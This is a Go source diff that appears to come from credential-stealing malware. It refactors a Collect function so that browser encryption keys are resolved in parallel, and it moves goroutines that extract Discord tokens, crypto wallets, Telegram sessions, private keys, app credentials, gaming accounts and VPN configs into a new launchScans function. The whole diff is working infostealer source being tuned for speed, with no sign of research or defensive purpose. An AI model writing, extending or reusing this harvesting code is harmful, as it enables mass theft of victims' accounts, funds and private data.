@@ -43,6 +43,13 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 	platform.ResetHandleCache()
 	defer platform.ResetHandleCache()
 
+	var (
+		mu sync.Mutex
+		wg sync.WaitGroup
+	)
+
+	launchScans(opts, result, partialFn, &wg, &mu)
+
 	platformSetupCollect()
 	defer platformTeardownCollect()
 
@@ -58,21 +65,48 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 
 	var states []browserState
 	if needsBrowserData {
-		for _, cfg := range browser.Browsers {
-			profiles := browser.FindProfileDirs(cfg)
-			if len(profiles) == 0 {
-				continue
-			}
-			logf("resolving keys for %s (%d profiles)", cfg.Name, len(profiles))
-			keys, err := crypto.ResolveKeys(cfg)
-			if err != nil {
-				result.Errors = append(result.Errors, fmt.Sprintf("%s key resolution: %v", cfg.Name, err))
-				logf("%s key resolution failed: %v", cfg.Name, err)
-				keys = &types.ResolvedKeys{}
-			}
-			pids, _ := platform.FindProcesses(cfg.ProcessName)
-			states = append(states, browserState{cfg, keys, profiles, pids})
+		type keyItem struct {
+			cfg      types.BrowserConfig
+			profiles []types.ProfileInfo
 		}
+		var items []keyItem
+		for _, cfg := range browser.Browsers {
+			if profiles := browser.FindProfileDirs(cfg); len(profiles) > 0 {
+				items = append(items, keyItem{cfg, profiles})
+			}
+		}
+
+		const keyWorkers = 3
+		sem := make(chan struct{}, keyWorkers)
+		states = make([]browserState, len(items))
+		errs := make([]string, len(items))
+		var keyWg sync.WaitGroup
+		for i, it := range items {
+			keyWg.Add(1)
+			go func(i int, it keyItem) {
+				defer keyWg.Done()
+				sem <- struct{}{}
+				defer func() { <-sem }()
+
+				logf("resolving keys for %s (%d profiles)", it.cfg.Name, len(it.profiles))
+				keys, err := crypto.ResolveKeys(it.cfg)
+				if err != nil {
+					logf("%s key resolution failed: %v", it.cfg.Name, err)
+					keys = &types.ResolvedKeys{}
+					errs[i] = fmt.Sprintf("%s key resolution: %v", it.cfg.Name, err)
+				}
+				pids, _ := platform.FindProcesses(it.cfg.ProcessName)
+				states[i] = browserState{it.cfg, keys, it.profiles, pids}
+			}(i, it)
+		}
+		keyWg.Wait()
+		mu.Lock()
+		for _, e := range errs {
+			if e != "" {
+				result.Errors = append(result.Errors, e)
+			}
+		}
+		mu.Unlock()
 	}
 
 	type job struct {
@@ -83,146 +117,6 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 	}
 
 	jobCh := make(chan job, 64)
-	var (
-		mu sync.Mutex
-		wg sync.WaitGroup
-	)
-
-	if opts.Discord {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("discord token extraction", &result.Errors, &mu)
-			tokens := discord.ExtractTokens()
-			if len(tokens) > 0 {
-				mu.Lock()
-				result.DiscordTokens = append(result.DiscordTokens, tokens...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{DiscordTokens: tokens})
-				}
-			}
-		}()
-	}
-
-	if opts.Files {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("file scan", &result.Errors, &mu)
-			files := scanner.ScanFiles()
-			if len(files) > 0 {
-				mu.Lock()
-				result.Files = append(result.Files, files...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Files: files})
-				}
-			}
-		}()
-	}
-
-	if opts.Wallets {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("wallet scan", &result.Errors, &mu)
-			wallets := scanner.ScanWallets()
-			if len(wallets) > 0 {
-				mu.Lock()
-				result.Wallets = append(result.Wallets, wallets...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Wallets: wallets})
-				}
-			}
-		}()
-	}
-
-	if opts.Telegram {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("telegram scan", &result.Errors, &mu)
-			sessions := scanner.ScanTelegram()
-			if len(sessions) > 0 {
-				mu.Lock()
-				result.Telegram = append(result.Telegram, sessions...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Telegram: sessions})
-				}
-			}
-		}()
-	}
-
-	if opts.Keys {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("key scan", &result.Errors, &mu)
-			keys := scanner.ScanKeys()
-			if len(keys) > 0 {
-				mu.Lock()
-				result.Keys = append(result.Keys, keys...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Keys: keys})
-				}
-			}
-		}()
-	}
-
-	if opts.Apps {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("app credentials scan", &result.Errors, &mu)
-			apps := scanner.ScanApps()
-			if len(apps) > 0 {
-				mu.Lock()
-				result.AppCredentials = append(result.AppCredentials, apps...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{AppCredentials: apps})
-				}
-			}
-		}()
-	}
-
-	if opts.Gaming {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("gaming scan", &result.Errors, &mu)
-			gaming := ScanGaming()
-			if gaming != nil {
-				mu.Lock()
-				result.Gaming = gaming
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Gaming: gaming})
-				}
-			}
-		}()
-	}
-
-	if opts.VPNs {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			defer recoverErrors("vpn scan", &result.Errors, &mu)
-			vpns := ScanVPNs()
-			if vpns != nil {
-				mu.Lock()
-				result.VPNs = vpns
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{VPNs: vpns})
-				}
-			}
-		}()
-	}
 
 	const workers = 4
 	for i := 0; i < workers; i++ {
@@ -275,6 +169,144 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 	}
 
 	return result, nil
+}
+
+func launchScans(opts types.CollectOptions, result *types.CollectionResult, partialFn func(*types.CollectionResult), wg *sync.WaitGroup, mu *sync.Mutex) {
+	if opts.Discord {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("discord token extraction", &result.Errors, mu)
+			tokens := discord.ExtractTokens()
+			if len(tokens) > 0 {
+				mu.Lock()
+				result.DiscordTokens = append(result.DiscordTokens, tokens...)
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{DiscordTokens: tokens})
+				}
+			}
+		}()
+	}
+
+	if opts.Files {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("file scan", &result.Errors, mu)
+			files := scanner.ScanFiles()
+			if len(files) > 0 {
+				mu.Lock()
+				result.Files = append(result.Files, files...)
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{Files: files})
+				}
+			}
+		}()
+	}
+
+	if opts.Wallets {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("wallet scan", &result.Errors, mu)
+			wallets := scanner.ScanWallets()
+			if len(wallets) > 0 {
+				mu.Lock()
+				result.Wallets = append(result.Wallets, wallets...)
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{Wallets: wallets})
+				}
+			}
+		}()
+	}
+
+	if opts.Telegram {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("telegram scan", &result.Errors, mu)
+			sessions := scanner.ScanTelegram()
+			if len(sessions) > 0 {
+				mu.Lock()
+				result.Telegram = append(result.Telegram, sessions...)
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{Telegram: sessions})
+				}
+			}
+		}()
+	}
+
+	if opts.Keys {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("key scan", &result.Errors, mu)
+			keys := scanner.ScanKeys()
+			if len(keys) > 0 {
+				mu.Lock()
+				result.Keys = append(result.Keys, keys...)
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{Keys: keys})
+				}
+			}
+		}()
+	}
+
+	if opts.Apps {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("app credentials scan", &result.Errors, mu)
+			apps := scanner.ScanApps()
+			if len(apps) > 0 {
+				mu.Lock()
+				result.AppCredentials = append(result.AppCredentials, apps...)
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{AppCredentials: apps})
+				}
+			}
+		}()
+	}
+
+	if opts.Gaming {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("gaming scan", &result.Errors, mu)
+			gaming := ScanGaming()
+			if gaming != nil {
+				mu.Lock()
+				result.Gaming = gaming
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{Gaming: gaming})
+				}
+			}
+		}()
+	}
+
+	if opts.VPNs {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			defer recoverErrors("vpn scan", &result.Errors, mu)
+			vpns := ScanVPNs()
+			if vpns != nil {
+				mu.Lock()
+				result.VPNs = vpns
+				mu.Unlock()
+				if partialFn != nil {
+					partialFn(&types.CollectionResult{VPNs: vpns})
+				}
+			}
+		}()
+	}
 }
 
 func extractProfileData(ctx context.Context, cfg types.BrowserConfig, keys *types.ResolvedKeys, profile types.ProfileInfo, pids []uint32, opts types.CollectOptions) *types.CollectionResult {
